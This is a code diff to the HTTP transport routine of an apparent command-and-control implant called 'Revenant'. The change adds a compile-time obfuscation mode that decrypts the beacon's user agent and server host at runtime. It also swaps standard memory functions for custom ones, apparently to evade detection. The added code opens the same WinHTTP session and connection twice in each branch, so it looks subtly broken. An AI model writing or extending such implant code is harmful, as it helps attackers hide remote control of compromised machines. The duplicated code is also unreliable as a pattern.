@@ -1,6 +1,7 @@
 #include "Revenant.h"
 #include "Transport.h"
 #include "Command.h"
+#include "Config.h"
 #include "Core.h"
 #include "Utilities.h"
 
@@ -150,6 +151,46 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
 
+#if CONFIG_OBFUSCATION
+    wchar_t USERAGENT[256];
+    DECRYPT_USER_AGENT(USERAGENT);
+
+    wchar_t HOST[256];
+    DECRYPT_HOST(HOST);
+
+    hSession = WinHttpOpen( USERAGENT, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    if ( ! hSession )
+    {
+        _tprintf( "WinHttpOpen: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+    hConnect = WinHttpConnect( hSession, HOST, Instance.Config.Transport.Port, 0 );
+    if ( ! hConnect )
+    {
+        _tprintf( "WinHttpConnect: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+    hSession = WinHttpOpen( USERAGENT, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    if ( ! hSession )
+    {
+        _tprintf( "WinHttpOpen: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+    hConnect = WinHttpConnect( hSession, HOST, Instance.Config.Transport.Port, 0 );
+    if ( ! hConnect )
+    {
+        _tprintf( "WinHttpConnect: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+#else
     hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
@@ -165,6 +206,25 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         Successful = FALSE;
         goto LEAVE;
     }
+
+
+    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    if ( ! hSession )
+    {
+        _tprintf( "WinHttpOpen: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
+    if ( ! hConnect )
+    {
+        _tprintf( "WinHttpConnect: Failed => %d\n", GetLastError() );
+        Successful = FALSE;
+        goto LEAVE;
+    }
+
+#endif //CONFIG_OBFUSCATION
 
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
@@ -215,8 +275,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
                 RespSize += BufRead;
 
-                memcpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
-                memset( Buffer, 0, 1024 );
+                mem_cpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
+                mem_set( Buffer, 0, 1024 );
 
             } while ( Successful == TRUE );
 
